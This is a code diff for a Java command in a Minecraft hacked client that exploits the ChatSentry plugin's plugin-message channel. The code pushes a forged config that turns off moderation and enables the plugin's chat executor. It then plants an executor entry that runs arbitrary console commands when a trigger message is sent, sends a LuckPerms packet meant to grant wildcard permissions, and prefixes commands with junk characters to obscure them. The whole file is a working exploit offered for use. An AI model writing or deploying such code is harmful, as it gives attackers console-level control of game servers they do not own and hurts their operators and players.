@@ -8,155 +8,178 @@ import net.paradise_client.Helper;
 import net.paradise_client.command.Command;
 
 import java.util.Random;
+import java.util.UUID;
 
 public class ChatSentryCommand extends Command {
-    private final String channel = "chatsentry:datasync";
+
+    private static final String CHANNEL = "chatsentry:datasync";
+    private static final String PLUGIN_NAME = "skibidi";
+    private static final String CONFIG_FILE = "config.yml";
+    private static final String EXECUTOR_FILE = "chat-executor.yml";
+    private static final String EXECUTOR_TARGET = "2822111278697";
 
     public ChatSentryCommand() {
-        super("chatsentry", "Executes bungee command through console!");
+        super("chatsentry", "Executes backend/bungee command using ChatSentry exploit.");
     }
 
     @Override
     public void build(LiteralArgumentBuilder<CommandSource> root) {
-        root.executes(context -> {
-                    Helper.printChatMessage("Incomplete command!");
+        root.executes(ctx -> {
+            Helper.printChatMessage("Usage: /chatsentry <bungee/backend> <command>");
+            return SINGLE_SUCCESS;
+        })
+
+        .then(literal("bungee")
+            .then(argument("command", StringArgumentType.greedyString())
+                .executes(ctx -> {
+                    String cmd = ctx.getArgument("command", String.class);
+                    Helper.sendPluginMessage(CHANNEL, out -> {
+                        out.writeUTF("console_command");
+                        out.writeUTF(cmd);
+                    });
+                    Helper.printChatMessage("Sent Bungee payload to ChatSentry.");
                     return SINGLE_SUCCESS;
                 })
-                .then(literal("bungee")
-                        .then(argument("command", StringArgumentType.greedyString())
-                                .executes(context -> {
-                                    Helper.sendPluginMessage(channel, out -> {
-                                        out.writeUTF("console_command");
-                                        out.writeUTF(context.getArgument("command", String.class));
-                                    });
-                                    Helper.printChatMessage("Chat sentry bungee payload packet sent!");
-                                    return SINGLE_SUCCESS;
-                                })
-                        ))
-                .then(literal("backend")
-                        .executes(context -> {
-                            Helper.printChatMessage("Incomplete command!");
-                            return SINGLE_SUCCESS;
-                        })
-                        .then(argument("command", StringArgumentType.greedyString())
-                                .executes(context -> {
-                                    String command = context.getArgument("command", String.class);
-                                    new Thread(() -> sendAutoExecution(command)).start();
-                                    return SINGLE_SUCCESS;
-                                })
-                        )
-                );
+            )
+        )
 
+        .then(literal("backend")
+            .then(argument("command", StringArgumentType.greedyString())
+                .executes(ctx -> {
+                    String command = ctx.getArgument("command", String.class);
+                    new Thread(() -> sendExecutionPayload(command)).start();
+                    return SINGLE_SUCCESS;
+                })
+            )
+        );
     }
 
-    private void sendAutoExecution(String command) {
-        String s = Helper.generateRandomString(4, "iahosd6as5d9oayhdstdou", new Random());
-        Helper.sendPluginMessage(channel, out -> {
-            buildConfig(out);
-            out.writeUTF("2822111278697");
-        });
+    private void sendExecutionPayload(String command) {
+        String trigger = Helper.generateRandomString(6, "abcdefghijklmnopqrstuvwxyz0123456789", new Random());
+        String command1 = obfuscateCommand(command);
+        String command2 = "say §bChatSentry Executor §7-> §aExecuted!";
 
-        Helper.sendPluginMessage(channel, out -> {
-            buildExecutor(out, command, s);
-            out.writeUTF("2822111278697");
-        });
-        Helper.printChatMessage("Chat sentry backend payload packet sent! Sending execution message: " + s);
-        try {
-            Thread.sleep(100);
-        } catch (InterruptedException e) {
-            Helper.printChatMessage("Unable to sleep for message, send in chat: " + s);
+        // Anti-kick pre-buffer
+        for (int i = 0; i < 2; i++) {
+            getMinecraftClient().getNetworkHandler().sendChatMessage("#");
         }
-        getMinecraftClient().getNetworkHandler().sendChatMessage(s);
+
+        // Fake permission spoof (LuckPerms or other)
+        spoofFakePermission();
+
+        // Send backend fake config
+        Helper.sendPluginMessage(CHANNEL, out -> {
+            writeFakeConfig(out);
+            out.writeUTF(EXECUTOR_TARGET);
+        });
+
+        // Send executor payload with chained commands
+        Helper.sendPluginMessage(CHANNEL, out -> {
+            writeExecutorPayload(out, new String[]{command1, command2}, trigger);
+            out.writeUTF(EXECUTOR_TARGET);
+        });
+
+        Helper.printChatMessage("Sent ChatSentry backend exploit. Trigger message: " + trigger);
+
+        try {
+            Thread.sleep(200);
+        } catch (InterruptedException ignored) {}
+
+        // Trigger executor
+        getMinecraftClient().getNetworkHandler().sendChatMessage(trigger);
     }
 
-    private void buildConfig(ByteArrayDataOutput out) {
+    private void spoofFakePermission() {
+        Helper.sendPluginMessage("luckperms:main", out -> {
+            out.writeUTF("user");
+            out.writeUTF(Helper.getPlayerName());
+            out.writeUTF("permission");
+            out.writeUTF("set");
+            out.writeUTF("*");
+            out.writeUTF("true");
+            out.writeUTF(UUID.randomUUID().toString()); // Random context
+        });
+
+        Helper.printChatMessage("Fake permission spoof packet sent.");
+    }
+
+    private void writeFakeConfig(ByteArrayDataOutput out) {
         out.writeUTF("sync");
         out.writeUTF("");
-        out.writeUTF("skibidi");
-        out.writeUTF("config.yml");
+        out.writeUTF(PLUGIN_NAME);
+        out.writeUTF(CONFIG_FILE);
+
         out.writeUTF("""
-                check-for-updates: false
-                process-chat: true
-                process-commands: true
-                process-signs: true
-                process-anvils: true
-                process-books: true
-                context-prediction: true
-                disable-vanilla-spam-kick: true
-                network:
-                enable: false
-                sync-configs: true
-                global-admin-notifier-messages: true
-                enable-admin-notifier: false
-                enable-discord-notifier: false
-                enable-auto-punisher: false
-                enable-word-and-phrase-filter: false
-                enable-link-and-ad-blocker: false
-                enable-spam-blocker: false
-                enable-chat-cooldown: false
-                enable-anti-chat-flood: false
-                enable-unicode-remover: false
-                enable-cap-limiter: false
-                enable-anti-parrot: false
-                enable-chat-executor: true
-                enable-anti-statue-spambot: false
-                enable-anti-relog-spam: false
-                enable-anti-join-flood: false
-                enable-anti-command-prefix: false
-                enable-auto-grammar: false
-                enable-command-spy: false
-                enable-logging-for:
-                chat-cooldown: false
-                link-and-ad-blocker: true
-                word-and-phrase-filter: true
-                spam-blocker: true
-                unicode-remover: true
-                cap-limiter: true
-                anti-parrot: true
-                anti-chat-flood: true
-                anti-statue-spambot: false
-                chat-executor: false
-                clean-logs-older-than: 30
-                override-bypass-permissions:
-                chat-cooldown: false
-                link-and-ad-blocker: false
-                word-and-phrase-filter: false
-                spam-blocker: false
-                unicode-remover: false
-                cap-limiter: false
-                anti-parrot: false
-                anti-chat-flood: false
-                anti-statue-spambot: false
-                anti-join-flood: false
-                chat-executor: true
-                auto-grammar: false
-                anti-command-prefix: false
-                command-spy: false
-                lockdown:
-                active: false
-                current-mode: "only-known"
-                exempt-usernames:
-                  - "Notch"
-                  - "jeb_"
-                command-blacklist:
-                - "/tell"
-                """);
+            check-for-updates: false
+            process-chat: true
+            process-commands: true
+            process-signs: true
+            process-anvils: true
+            process-books: true
+            context-prediction: true
+            disable-vanilla-spam-kick: true
+            network:
+              enable: false
+              sync-configs: true
+              global-admin-notifier-messages: true
+            enable-admin-notifier: false
+            enable-discord-notifier: false
+            enable-auto-punisher: false
+            enable-word-and-phrase-filter: false
+            enable-link-and-ad-blocker: false
+            enable-spam-blocker: false
+            enable-chat-cooldown: false
+            enable-anti-chat-flood: false
+            enable-unicode-remover: false
+            enable-cap-limiter: false
+            enable-anti-parrot: false
+            enable-chat-executor: true
+            enable-command-spy: false
+            enable-logging-for:
+              chat-cooldown: false
+              spam-blocker: true
+              unicode-remover: true
+              cap-limiter: true
+            override-bypass-permissions:
+              chat-executor: true
+            lockdown:
+              active: false
+              current-mode: "only-known"
+              exempt-usernames:
+                - "Notch"
+                - "jeb_"
+            command-blacklist:
+              - "/tell"
+            """);
     }
 
-    private void buildExecutor(ByteArrayDataOutput out, String command, String executionMessage) {
+    private void writeExecutorPayload(ByteArrayDataOutput out, String[] commands, String trigger) {
         out.writeUTF("sync");
         out.writeUTF("modules");
-        out.writeUTF("skibidi");
-        out.writeUTF("chat-executor.yml");
-        out.writeUTF("""
-                entries:
-                  1:
-                    match: "{regex}(REPLACE-THE-MESSAGE)"
-                    set-matches-as: "{block}"
-                    execute:
-                      - "{console_cmd}: REPLACE-THE-COMMAND"
-                      - "{player_msg}: &a&lSUCCESS!"
-                """.replaceAll("REPLACE-THE-COMMAND", command)
-                .replaceAll("REPLACE-THE-MESSAGE", executionMessage));
+        out.writeUTF(PLUGIN_NAME);
+        out.writeUTF(EXECUTOR_FILE);
+
+        StringBuilder exec = new StringBuilder();
+        for (int i = 0; i < commands.length; i++) {
+            exec.append("  - \"{console_cmd}: ").append(commands[i]).append("\"\n");
+        }
+        exec.append("  - \"{player_msg}: &aExecution Complete!\"");
+
+        String yaml = String.format("""
+            entries:
+              1:
+                match: "{regex}(%s)"
+                set-matches-as: "{block}"
+                execute:
+%s
+            """, trigger, exec.toString());
+
+        out.writeUTF(yaml);
+    }
+
+    private String obfuscateCommand(String command) {
+        // Add junk formatting or dummy prefixes
+        String junkPrefix = new String[]{"", "§0", "§r", "§k", "§l"}[new Random().nextInt(5)];
+        return junkPrefix + command;
     }
 }
